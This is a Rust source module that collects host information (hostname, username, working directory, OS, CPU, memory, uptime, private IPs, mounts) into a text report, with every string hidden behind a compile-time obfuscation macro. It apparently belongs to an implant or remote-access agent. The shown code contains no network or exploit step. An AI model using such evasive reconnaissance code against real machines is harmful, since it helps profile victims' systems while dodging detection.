use encstr::astr;
use std::env;

#[cfg(any(target_os = "linux", target_os = "android"))]
use std::fs;

fn get_os_info() -> String {
    #[cfg(any(target_os = "linux", target_os = "android"))]
    {
        fs::read_to_string(astr!("/proc/version"))
            .unwrap_or_else(|_| astr!("unknown"))
            .trim()
            .to_string()
    }
    #[cfg(target_os = "windows")]
    {
        astr!("Windows")
    }
    #[cfg(target_os = "macos")]
    {
        astr!("macOS")
    }
}

fn get_cpu_info() -> String {
    #[cfg(any(target_os = "linux", target_os = "android"))]
    {
        fs::read_to_string(astr!("/proc/cpuinfo"))
            .ok()
            .and_then(|content| {
                content
                    .lines()
                    .find(|l| l.starts_with("model name"))
                    .and_then(|l| l.split(':').nth(1).map(|s| s.trim().to_string()))
            })
            .unwrap_or_else(|| astr!("unknown"))
    }
    #[cfg(not(any(target_os = "linux", target_os = "android")))]
    {
        astr!("unknown")
    }
}

fn get_cpu_cores() -> String {
    #[cfg(any(target_os = "linux", target_os = "android"))]
    {
        fs::read_to_string(astr!("/proc/cpuinfo"))
            .ok()
            .map(|content| {
                content
                    .lines()
                    .filter(|l| l.starts_with("processor"))
                    .count()
                    .to_string()
            })
            .unwrap_or_else(|| astr!("unknown"))
    }
    #[cfg(not(any(target_os = "linux", target_os = "android")))]
    {
        astr!("unknown")
    }
}

fn get_memory_info() -> String {
    #[cfg(any(target_os = "linux", target_os = "android"))]
    {
        let meminfo =
            fs::read_to_string(astr!("/proc/meminfo")).unwrap_or_default();
        let total = meminfo
            .lines()
            .find(|l| l.starts_with("MemTotal:"))
            .and_then(|l| l.split_whitespace().nth(1))
            .unwrap_or("unknown");
        let avail = meminfo
            .lines()
            .find(|l| l.starts_with("MemAvailable:"))
            .and_then(|l| l.split_whitespace().nth(1))
            .unwrap_or("unknown");
        format!("{} kB total, {} kB available", total, avail)
    }
    #[cfg(not(any(target_os = "linux", target_os = "android")))]
    {
        astr!("unknown")
    }
}

fn get_uptime() -> String {
    #[cfg(any(target_os = "linux", target_os = "android"))]
    {
        fs::read_to_string(astr!("/proc/uptime"))
            .ok()
            .and_then(|content| {
                content
                    .split_whitespace()
                    .next()
                    .and_then(|s| s.parse::<f64>().ok())
                    .map(|secs| {
                        let days = (secs / 86400.0) as u64;
                        let hours = ((secs % 86400.0) / 3600.0) as u64;
                        let minutes = ((secs % 3600.0) / 60.0) as u64;
                        format!("{}d {}h {}m", days, hours, minutes)
                    })
            })
            .unwrap_or_else(|| astr!("unknown"))
    }
    #[cfg(not(any(target_os = "linux", target_os = "android")))]
    {
        astr!("unknown")
    }
}

fn get_private_ips() -> String {
    let mut ips = Vec::new();
    #[cfg(any(target_os = "linux", target_os = "android", target_os = "macos"))]
    {
        use std::ffi::CStr;
        use std::net::Ipv4Addr;

        unsafe {
            let mut ifap: *mut libc::ifaddrs = std::ptr::null_mut();
            if libc::getifaddrs(&mut ifap) == 0 {
                let mut ptr = ifap;
                while !ptr.is_null() {
                    let ifa = &*ptr;
                    if !ifa.ifa_addr.is_null() {
                        let family = (*ifa.ifa_addr).sa_family as i32;
                        if family == libc::AF_INET {
                            let addr = &*(ifa.ifa_addr as *const libc::sockaddr_in);
                            let ip = Ipv4Addr::from(u32::from_be(addr.sin_addr.s_addr));
                            if !ip.is_loopback() && !ip.is_link_local() {
                                let name = CStr::from_ptr(ifa.ifa_name)
                                    .to_string_lossy()
                                    .into_owned();
                                ips.push(format!("{}: {}", name, ip));
                            }
                        }
                    }
                    ptr = ifa.ifa_next;
                }
                libc::freeifaddrs(ifap);
            }
        }
    }
    #[cfg(target_os = "windows")]
    {
        ips.push(astr!("N/A (Windows)"));
    }
    if ips.is_empty() {
        astr!("none")
    } else {
        ips.join(&astr!(", "))
    }
}

fn get_disk_info() -> String {
    #[cfg(any(target_os = "linux", target_os = "android"))]
    {
        let mounts = fs::read_to_string(astr!("/proc/mounts"))
            .unwrap_or_default();
        let mut parts = Vec::new();
        for line in mounts.lines().take(20) {
            let fields: Vec<&str> = line.split_whitespace().collect();
            if fields.len() >= 2 {
                let mount_point = fields[1];
                if mount_point.starts_with(&astr!("/"))
                    && !mount_point.starts_with(&astr!("/proc"))
                    && !mount_point.starts_with(&astr!("/sys"))
                    && !mount_point.starts_with(&astr!("/dev"))
                    && !mount_point.starts_with(&astr!("/run"))
                {
                    parts.push(mount_point.to_string());
                }
            }
        }
        parts.join(&astr!(", "))
    }
    #[cfg(not(any(target_os = "linux", target_os = "android")))]
    {
        astr!("unknown")
    }
}

pub fn gather_sysinfo() -> Result<String, String> {
    let hostname = gethostname::gethostname()
        .into_string()
        .unwrap_or_else(|_| astr!("unknown"));

    let username = env::var(astr!("USER"))
        .or_else(|_| env::var(astr!("USERNAME")))
        .unwrap_or_else(|_| astr!("unknown"));

    let cwd = std::env::current_dir()
        .map(|p| p.display().to_string())
        .unwrap_or_else(|_| astr!("unknown"));

    let mut info = String::new();

    info.push_str(&format!("{}{}\n", astr!("Hostname:        "), hostname));
    info.push_str(&format!("{}{}\n", astr!("Username:        "), username));
    info.push_str(&format!("{}{}\n", astr!("Current Dir:     "), cwd));
    info.push_str(&format!("{}{}\n", astr!("OS:              "), get_os_info()));
    info.push_str(&format!("{}{}\n", astr!("CPU:             "), get_cpu_info()));
    info.push_str(&format!("{}{}\n", astr!("Cores:           "), get_cpu_cores()));
    info.push_str(&format!("{}{}\n", astr!("Memory:          "), get_memory_info()));
    info.push_str(&format!("{}{}\n", astr!("Uptime:          "), get_uptime()));
    info.push_str(&format!("{}{}\n", astr!("Private IPs:     "), get_private_ips()));
    info.push_str(&format!("{}{}\n", astr!("Mounts:          "), get_disk_info()));

    Ok(info)
}
